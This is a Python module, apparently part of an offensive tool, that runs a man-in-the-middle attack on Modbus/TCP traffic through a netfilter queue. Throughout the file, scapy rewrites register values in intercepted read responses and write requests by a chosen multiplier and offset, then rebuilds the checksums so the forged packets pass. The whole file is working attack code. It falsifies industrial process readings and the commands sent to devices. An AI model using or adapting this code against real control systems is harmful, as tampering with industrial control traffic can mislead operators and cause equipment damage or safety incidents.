'''
NFQ module. Callbacks and persistent object
'''

from scapy.all import IP, TCP, Packet, Ether, IPv6
from scapy.contrib.modbus import *
from ..buffer import Buffer
from ..buffer.meta_packet import MetaPacket

class NetFilterQueueBaseClass:

    def __init__(self, buffer: Buffer, context):
        self.buffer = buffer
        self.context = context
        self.slot_name = "modbus_variables"

        self.running = False
        self.stop_event = None
        self.thread = None

    def is_running(self):
        return self.running

    def stop(self):
        if not self.is_running():
            self.buffer.put("nfq", "MITM attack is not running")
            return
        else:
            self.stop_event.set()
            self.thread.join(timeout=2)
            self.stop_event = None
            self.thread = None
            self.buffer.put("nfq", "Stopped MITM attack")
            self.running = False

    def modify_mpkt(self, mpkt: MetaPacket) -> tuple[Packet, bool]:
        modified_flag = False
        if not mpkt.is_modbus or len(mpkt.variables) < 1:
            return mpkt.pkt, modified_flag

        slots = self.context.states[self.slot_name]
        for i, variable in enumerate(mpkt.variables):
            slot = slots[variable]
            mult = float(slot["multiplier"])
            offs = float(slot["offset"])
            if mult == 1.0 and offs == 0.0:
                continue

            if m := mpkt.pkt.getlayer(ModbusPDU03ReadHoldingRegistersResponse):
                val = m.registerVal[i]
                val = int(val * mult + offs)
                val = max(0, min(65535, val))
                m.registerVal[i] = val
                modified_flag = True

            elif m := mpkt.pkt.getlayer(ModbusPDU06WriteSingleRegisterRequest):
                address = m.registerAddr
                val = m.registerValue
                val = int(val * mult + offs)
                val = max(0, min(65535, val))
                m.registerValue = val
                modified_flag = True

        if modified_flag:
            del mpkt.pkt[IP].len
            del mpkt.pkt[TCP].chksum
            del mpkt.pkt[IP].chksum

            mpkt.pkt = IP(bytes(mpkt.pkt))
        return mpkt.pkt, modified_flag